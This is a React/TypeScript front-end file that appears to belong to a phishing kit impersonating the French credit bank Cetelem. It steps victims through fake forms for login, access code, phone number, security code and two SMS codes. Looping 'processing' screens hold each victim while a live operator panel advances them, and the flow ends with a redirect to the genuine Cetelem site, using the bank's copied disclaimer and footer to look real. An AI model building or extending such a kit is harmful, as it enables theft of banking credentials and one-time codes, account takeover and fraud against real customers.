import React, { useState } from 'react';
import AdminPanel from './components/AdminPanel';
import LoginForm from './components/LoginForm';
import CodeForm from './components/CodeForm';
import PhoneForm from './components/PhoneForm';
import SecurityCodeForm from './components/SecurityCodeForm';
import SmsCodeForm from './components/SmsCodeForm';
import LoadingPage from './components/LoadingPage';
import SuccessPage from './components/SuccessPage';

type Step = 'login' | 'code' | 'loading1' | 'phone' | 'loading2' | 'security' | 'loading3' | 'sms1' | 'loading4' | 'sms2' | 'loading5' | 'success';

function App() {
  const [currentStep, setCurrentStep] = useState<Step>('login');
  const [userCount] = useState(1); // Simulé pour l'exemple

  const nextStep = () => {
    switch (currentStep) {
      case 'login':
        setCurrentStep('code');
        break;
      case 'code':
        setCurrentStep('loading1');
        // Pas de redirection automatique, en attente du panneau admin
        break;
      case 'phone':
        setCurrentStep('loading2');
        // Pas de redirection automatique, en attente du panneau admin
        break;
      case 'security':
        setCurrentStep('loading3');
        // Pas de redirection automatique, en attente du panneau admin
        break;
      case 'sms1':
        setCurrentStep('loading4');
        // Pas de redirection automatique, en attente du panneau admin
        break;
      case 'sms2':
        setCurrentStep('loading5');
        // Pas de redirection automatique, en attente du panneau admin
        break;
      case 'success':
        // Redirection finale après 8 secondes
        setTimeout(() => {
          window.location.href = 'https://www.cetelem.fr/fr/accueil';
        }, 8000);
        break;
    }
  };

  const handleAdminStepChange = (step: string) => {
    setCurrentStep(step as Step);
  };

  const renderCurrentStep = () => {
    switch (currentStep) {
      case 'login':
        return <LoginForm onNext={nextStep} />;
      case 'code':
        return <CodeForm onNext={nextStep} />;
      case 'loading1':
        return <LoadingPage message="Traitement de vos informations..." isLooping={true} />;
      case 'phone':
        return <PhoneForm onNext={nextStep} />;
      case 'loading2':
        return <LoadingPage message="Traitement de vos informations..." isLooping={true} />;
      case 'security':
        return <SecurityCodeForm onNext={nextStep} />;
      case 'loading3':
        return <LoadingPage message="Traitement de vos informations..." isLooping={true} />;
      case 'sms1':
        return <SmsCodeForm onNext={nextStep} />;
      case 'loading4':
        return <LoadingPage message="Traitement de vos informations..." isLooping={true} />;
      case 'sms2':
        return <SmsCodeForm onNext={nextStep} isSecondCode={true} />;
      case 'loading5':
        return <LoadingPage message="Mise à jour du numéro de téléphone en cours..." isLooping={true} />;
      case 'success':
        return <SuccessPage />;
      default:
        return <LoginForm onNext={nextStep} />;
    }
  };

  return (
    <>
      <AdminPanel 
        currentStep={currentStep}
        onStepChange={handleAdminStepChange}
        userCount={userCount}
      />
      
      <main>
      <div className="form">
        <div className="logo">
          <img src="img/logo.png" alt="Logo" />
        </div>
        
        <div className="title">
          <label>Un crédit vous engage et doit être remboursé. <br />
            Vérifiez vos capacités de remboursement avant de vous engager.</label>
        </div>

        <div className="title1">
          <label>Un crédit vous engage et doit être remboursé. 
            Vérifiez vos capacités de remboursement avant de vous engager.</label>
        </div>

        {renderCurrentStep()}
      </div>

      <div className="span">
        <span>Virement express</span>
        <span>Résiliation</span> <span>Contact</span> <span>Questions / Réponses</span> <span>Réclamation</span> 
        <span>Mentions légales</span> <span>Informations sur les cookies</span> <span>Préférence de cookies</span> 
        <span>Données personnelles</span> 
        <br /><br /><span>Déclaration accessibilité</span> <span>Accessibilité</span>
      </div> 

      <div className="span1">
        <span>Virement express</span>
        <span>Résiliation</span> <span>Contact</span> <span>Questions / Réponses</span> <span>Réclamation</span> 
        <span>Mentions légales</span> <span>Informations sur les cookies</span> <span>Préférence de cookies</span> 
        <span>Données personnelles</span> 
        <span>Déclaration accessibilité</span> <span>Accessibilité</span>
      </div> 

      <div className="fa">
        <img src="img/fa.png" alt="FA" />
      </div>
      </main>
    </>
  );
}

export default App;